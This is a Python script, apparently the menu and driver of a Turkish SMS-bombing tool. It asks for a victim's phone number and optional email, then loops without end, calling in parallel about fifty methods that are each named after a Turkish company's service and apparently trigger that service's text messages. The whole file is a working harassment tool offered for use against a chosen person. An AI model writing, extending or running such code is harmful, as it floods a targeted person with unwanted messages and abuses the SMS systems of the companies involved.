from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

            
while 1:
    system("cls||clear")
    print("""{} 
   S M S B O M B A &  SMS
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMSBOMBA\n\n 2- ÇIK\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 2:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
    elif menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Ipragaz),
                        executor.submit(send_sms.Istegelsin),
                        executor.submit(send_sms.Joker),
                        executor.submit(send_sms.KahveDunyasi),
                        executor.submit(send_sms.KimGb),
                        executor.submit(send_sms.Komagene),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.KuryemGelsin),
                        executor.submit(send_sms.Macro),
                        executor.submit(send_sms.Metro),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Naosstars),
                        executor.submit(send_sms.Paybol),
                        executor.submit(send_sms.Pidem),
                        executor.submit(send_sms.Porty),
                        executor.submit(send_sms.Qumpara),
                        executor.submit(send_sms.Starbucks),
                        executor.submit(send_sms.Suiste),
                        executor.submit(send_sms.Taksim),
                        executor.submit(send_sms.Tasdelen),
                        executor.submit(send_sms.Tasimacim),
                        executor.submit(send_sms.Tazi),
                        executor.submit(send_sms.TiklaGelsin),
                        executor.submit(send_sms.ToptanTeslim),
                        executor.submit(send_sms.Ucdortbes),
                        executor.submit(send_sms.Uysal),
                        executor.submit(send_sms.Wmf),
                        executor.submit(send_sms.Yapp),
                        executor.submit(send_sms.YilmazTicaret),
                        executor.submit(send_sms.Yuffi)
                    ]
                    wait(futures)
        except KeyboardInterrupt:
            system("cls||clear")
            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
            sleep(2)
